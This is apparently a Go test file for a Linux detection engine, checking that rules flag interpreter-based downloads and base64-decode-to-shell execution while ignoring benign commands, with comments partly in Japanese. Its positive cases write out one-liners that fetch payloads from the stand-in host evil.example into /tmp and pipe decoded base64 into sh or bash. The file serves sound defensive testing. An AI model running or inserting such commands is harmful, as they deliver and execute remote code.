package detection

import (
	"strings"
	"testing"
)

// TestEvasionBuiltins verifies the evasion-hardening built-in rules fire on the
// obfuscation/curl-evasion手口 surfaced by the live adversarial test
// (docs/results/live-20260702-linux-evasion-adversarial.md) and stay quiet on
// ordinary interpreter/base64 use. These run through the real EvaluateEnvelope
// oracle (typed findings + built-in Sigma via the api-pipeline aliases).

func evalProcLinux(cmd string) []EvalFinding {
	return EvaluateEnvelope("process", map[string]interface{}{
		"type":         "process",
		"image_path":   "/usr/bin/python3",
		"process_name": "python3",
		"command_line": cmd,
		"action":       "create",
	})
}

func firedTitleContains(findings []EvalFinding, substr string) bool {
	for _, f := range findings {
		if strings.Contains(f.Title, substr) {
			return true
		}
	}
	return false
}

// ── T1105: interpreter-based ingress tool transfer (curl/wget evasion) ──

func TestEvasion_InterpreterDownload_Fires(t *testing.T) {
	cases := []string{
		`python3 -c 'import urllib.request; urllib.request.urlretrieve("http://evil.example/p","/tmp/p")'`,
		`python3 -c 'import requests; open("/tmp/p","wb").write(requests.get("http://evil.example/p").content)'`,
		`perl -e 'use LWP::Simple; getstore("http://evil.example/p","/tmp/p")'`,
		`php -r 'file_put_contents("/tmp/p", file_get_contents("https://evil.example/p"));'`,
	}
	for _, cmd := range cases {
		if f := evalProcLinux(cmd); !firedTitleContains(f, "Ingress Tool Transfer via Interpreter") {
			t.Errorf("インタプリタDLが検知されるべき: %q → findings=%v", cmd, titles(f))
		}
	}
}

func TestEvasion_InterpreterDownload_QuietOnBenign(t *testing.T) {
	// interpreter use WITHOUT a URL must not fire the download rule.
	benign := []string{
		`python3 -c 'import urllib.parse; print(urllib.parse.quote("a b"))'`, // urllib but no URL
		`python3 manage.py migrate`,
	}
	for _, cmd := range benign {
		if f := evalProcLinux(cmd); firedTitleContains(f, "Ingress Tool Transfer via Interpreter") {
			t.Errorf("URL 無しのインタプリタ利用は誤検知すべきでない: %q", cmd)
		}
	}
}

// ── T1140/T1027: base64 decode piped to a shell/interpreter ──

func TestEvasion_Base64DecodeExec_Fires(t *testing.T) {
	cases := []string{
		`echo ZWNobyBoaQ== | base64 -d | sh`,
		`echo ZWNobyBoaQ== | base64 --decode | bash`,
		`python3 -c 'import base64,os; os.system(base64.b64decode("ZWNobyBoaQ==").decode())'`,
	}
	for _, cmd := range cases {
		if f := evalProcLinux(cmd); !firedTitleContains(f, "Base64 Payload Decoded") {
			t.Errorf("base64デコード実行が検知されるべき: %q → findings=%v", cmd, titles(f))
		}
	}
}

func TestEvasion_Base64DecodeExec_QuietOnBenign(t *testing.T) {
	// decoding base64 to a file (no pipe to a shell/interpreter) must not fire.
	benign := []string{
		`base64 -d cert.b64 > cert.der`,
		`echo aGVsbG8= | base64 -d`,
	}
	for _, cmd := range benign {
		if f := evalProcLinux(cmd); firedTitleContains(f, "Base64 Payload Decoded") {
			t.Errorf("シェルへパイプしない base64 デコードは誤検知すべきでない: %q", cmd)
		}
	}
}

func titles(f []EvalFinding) []string {
	out := make([]string, 0, len(f))
	for _, x := range f {
		out = append(out, x.Title)
	}
	return out
}
